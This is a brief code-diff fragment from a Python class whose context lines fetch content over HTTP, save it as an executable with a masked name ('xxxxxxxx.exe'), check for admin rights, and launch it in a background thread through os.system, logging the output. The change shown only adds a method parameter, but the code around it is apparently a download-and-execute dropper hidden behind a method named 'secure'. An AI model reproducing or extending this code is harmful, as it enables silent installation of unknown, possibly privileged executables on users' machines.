@@ -20,7 +20,7 @@ class xyz():
                 open('xxxxxxxx.exe', 'wb').write(r.content)
                 self.is_admin = is_admin()
 
-        def secure(self):
+        def secure(self,x):
 
                 def send():
                     t = threading.Thread(target=os.system, args=('xxxxxxxx.exe > log.txt',) )
